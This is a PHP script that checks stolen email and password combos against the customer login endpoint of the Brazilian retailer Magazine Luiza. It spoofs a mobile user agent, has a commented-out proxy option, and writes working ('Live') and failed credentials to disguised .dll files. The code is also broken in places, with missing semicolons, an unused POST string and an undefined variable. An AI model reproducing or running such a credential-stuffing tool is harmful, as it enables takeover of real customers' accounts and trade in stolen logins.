<?php
require ('./class_curl.php');

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}


if ($_POST['do'] == 'check')
{

    $curl = new curl();
    delete_cookies();
    $curl->ua('Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16');
 

    $result = array();
    $delim = urldecode($_POST['delim']);
    list($email, $pwd) = explode($delim, urldecode($_POST['mailpass']));
//   $sock = urldecode($_POST['IP']);

    if (!$email)
    {
        $result['error'] = -1;
        $result['msg'] = urldecode($_POST['mailpass']);
        echo json_encode($result);
        exit;
    }
    
    delete_cookies();
 //  $curl->sock5($sock);

	if($curl->validate()){
		$fullink='https://www.magazineluiza.com.br/cliente/login.json'
		$ref='https://www.magazineluiza.com.br/cliente/login/'
		$post_string='email='.$email.'&password='.$pwd.'';
		$curl->page($fullink);
		
		if($curl->validate()){
		
		
		//	file_put_contents('2.html', $curl->content);
			 
			 if(stripos($curl->content, '"code": 0') !== false){
			 	$result['error'] = 2;
				$result['msg'] = '<b style="color:red;">Die</b> => '. $sock . ' | '. $email .' | ' .$pwd.'| Checked'; 
				             $file = fopen("Die.dll","a+");
             fwrite($file,$email."|".$pwd."\n");
             fclose($file);

			 }
			 //var message={
			 elseif(substr_count($curl->content, '"code": 5') !== false)	 
			 {
			 
				$result['error'] = 0;
                $result['msg'] = '<b style="color:yellow;">Live</b> => ' . $email . ' | ' . $pwd.' | $temp www.technologychecker.us'; 
				             $file = fopen("live.dll","a+");
             fwrite($file,$email."|".$pwd."\n");
             fclose($file);


			 }
			
			 else{
			 
					 
			 	$result['error'] = 2;
                $result['msg'] = '<b style="color:red;">Can Check</b> => ' . $email . ' | ' . $pwd.' | Ckecked'; 
				             $file = fopen("Die2.dll","a+");
             fwrite($file,$email."|".$pwd."\n");
             fclose($file);
			 }
			
							
		}else{
	
	
		$result['error'] = 1;
        $result['msg'] = $sock . ' => Die/Timeout1';
	
		}	
		
	
	
	}else{
	
	
		$result['error'] = 1;
        $result['msg'] = $sock . ' => Die/Timeout1';
	
	}
	
	

    echo json_encode($result);
    exit;

}

?>